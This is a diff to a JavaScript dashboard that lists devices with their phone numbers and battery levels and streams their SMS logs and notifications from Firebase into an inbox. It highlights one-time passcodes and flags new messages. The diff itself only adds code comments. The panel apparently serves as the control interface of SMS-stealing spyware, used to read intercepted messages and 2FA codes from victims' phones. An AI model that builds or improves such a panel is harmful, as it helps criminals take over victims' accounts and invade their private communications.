@@ -811,6 +811,7 @@
             grid.appendChild(card);
         });
 
+        // Auto-select first if none selected
         if (!selectedDeviceId && userIds.length > 0) {
             selectDevice(userIds[0]);
         }
@@ -820,10 +821,12 @@
         if (selectedDeviceId === deviceId) return;
         selectedDeviceId = deviceId;
         renderDevices();
+        // Force refresh inbox with latest data
         renderInbox();
         document.getElementById('newMsgDot').classList.remove('show');
     }
 
+    // ===== RENDER INBOX =====
     function renderInbox(newMessageId = null) {
         const container = document.getElementById('inboxMessages');
         const info = document.getElementById('selectedDeviceInfo');
@@ -836,6 +839,7 @@
             return;
         }
 
+        // Get the LATEST data directly from allUsers
         const user = allUsers[selectedDeviceId];
         const phone = getPhoneNumber(user) || 'No number';
         const battery = getBattery(user);
@@ -850,9 +854,11 @@
             return;
         }
 
+        // If new message ID is provided and it's for the selected device
         if (newMessageId) {
             const newSms = smsList.find(s => s.id === newMessageId);
             if (newSms) {
+                // Prepend the new message
                 const div = document.createElement('div');
                 div.className = 'inbox-message new-message';
                 const sender = newSms.sender || 'Unknown';
@@ -874,17 +880,24 @@
                     <div class="msg-body ${isOTP ? 'highlight' : ''}">${bodyHtml}</div>
                 `;
                 
+                // Prepend and scroll to top
                 container.prepend(div);
                 container.scrollTop = 0;
+                
+                // Show notification dot
                 document.getElementById('newMsgDot').classList.add('show');
+                
+                // Update device card count
                 updateDeviceCardSmsCount(selectedDeviceId);
                 updateStats();
                 return;
             }
         }
 
+        // Full render (initial load or when selecting a device)
         container.innerHTML = '';
 
+        // Show notifications first
         notifList.forEach(notif => {
             const div = document.createElement('div');
             div.className = 'inbox-message';
@@ -898,6 +911,7 @@
             container.appendChild(div);
         });
 
+        // Then SMS
         smsList.forEach(sms => {
             const div = document.createElement('div');
             div.className = 'inbox-message';
@@ -977,11 +991,13 @@
     function setupFirebaseListeners() {
         const usersRef = database.ref('users');
 
+        // Listen for all user data changes
         usersRef.on('value', (snapshot) => {
             const data = snapshot.val();
             if (data) {
                 allUsers = data;
                 renderDevices();
+                // Only update inbox if we have a selected device
                 if (selectedDeviceId && allUsers[selectedDeviceId]) {
                     renderInbox();
                 }
@@ -997,6 +1013,7 @@
             }
         });
 
+        // Listen for specific user changes
         usersRef.on('child_added', (snapshot) => {
             const key = snapshot.key;
             const data = snapshot.val();
@@ -1019,11 +1036,13 @@
                 renderDevices();
                 updateStats();
                 
+                // Check if this is the selected device
                 if (key === selectedDeviceId) {
                     const oldSmsCount = oldData?.sms_logs ? Object.keys(oldData.sms_logs).length : 0;
                     const newSmsCount = data.sms_logs ? Object.keys(data.sms_logs).length : 0;
                     
                     if (newSmsCount > oldSmsCount) {
+                        // Find new message
                         const oldIds = oldData?.sms_logs ? Object.keys(oldData.sms_logs) : [];
                         const newIds = data.sms_logs ? Object.keys(data.sms_logs) : [];
                         const newMsgId = newIds.find(id => !oldIds.includes(id));
